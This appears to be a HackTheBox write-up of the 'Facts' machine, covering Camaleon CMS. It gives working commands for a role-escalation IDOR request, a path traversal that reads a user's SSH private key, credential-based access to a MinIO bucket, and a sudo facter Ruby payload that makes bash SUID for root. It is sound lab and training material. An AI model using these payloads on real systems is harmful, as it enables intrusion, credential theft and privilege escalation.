---
title: "Facts"
difficulty: Easy
os: linux
points: 20
rating: 4.5
date: 2026-01-31
avatar: assets/htb/facts.png
tags: [web, idor, path-traversal, s3, minio, ruby, sudo]
htb_url: https://app.hackthebox.com/machines/Facts
---
## Summary

Facts is the first machine of HTB Season 10 (Underground), a Linux box built around a Ruby on Rails CMS called Camaleon CMS. My attack chain starts on the web: an IDOR in the admin registration/update flow lets me mass-assign myself the `admin` role, and from there a path traversal in Camaleon's `download_private_file` reads an SSH private key off disk for the user shell. Pivoting through plaintext cloud-storage credentials wired into the CMS settings unlocks a MinIO bucket holding a backup key, and root falls to `sudo facter --custom-dir=`, which executes the first `.rb` script in a supplied directory as root.

## Enumeration

I start with a full TCP sweep and service detection:

```bash
nmap -p- --min-rate=10000 -sV -sC facts.htb
# 22/tcp  ssh
# 80/tcp  nginx -> Camaleon CMS (Ruby on Rails)
```

Two services: SSH on 22 and nginx on 80 fronting a Camaleon CMS (Ruby on Rails) install. I add `facts.htb` to `/etc/hosts`, browse the site, and locate the admin registration page at `/admin/register`. Camaleon is v2.9.0, which turns out to carry an unauthenticated-to-authenticated path traversal in `download_private_file`.

## Foothold

First I register a low-privilege user through `/admin/register`. Camaleon's profile-update endpoint allows updating arbitrary attributes for any user, including `role`, so I exploit the IDOR to promote my own account to `admin`:

```bash
curl -X PATCH http://facts.htb/admin/users/1 \
  -H "Cookie: _camaleon_session=<sess>" \
  -d "user[role]=admin"
```

With admin access, the `download_private_file` action traverses outside the media root, letting me read arbitrary files from the filesystem. I pull the user's SSH private key:

```
GET /admin/media/download_private_file?file=../../../../../home/sherman/.ssh/id_rsa
```

That recovers the key and I SSH in as the user for the foothold.

## Privilege Escalation

### Cloud storage pivot

Inside `Settings -> General Site -> Filesystem Settings`, the CMS is wired to an S3-compatible MinIO bucket with a plaintext access key and secret. These hardcoded credentials are a classic secrets-in-config sink. I point the AWS CLI at the MinIO endpoint and list, then pull, the backup key:

```bash
aws --endpoint-url http://facts.htb:9000 s3 ls
aws --endpoint-url http://facts.htb:9000 s3 cp s3://backups/id_rsa -
```

### Root via sudo facter

Checking sudo rights reveals the misconfiguration:

```bash
sudo -l
# (root) NOPASSWD: /usr/bin/facter --custom-dir=*
```

`facter` loads the first `.rb` file from the custom-dir path through Ruby, and since the rule runs as root with a trailing wildcard, this is arbitrary code execution as root. I drop a fact that SUIDs bash and run it:

```bash
mkdir /tmp/pwn
cat > /tmp/pwn/pwn.rb <<'EOF'
Facter.add(:pwn) { setcode { system("chmod +s /bin/bash") } }
EOF
sudo /usr/bin/facter --custom-dir=/tmp/pwn
/bin/bash -p
# uid=1000(sherman) euid=0(root)
```

That gives me a root-effective shell and full control of the box.
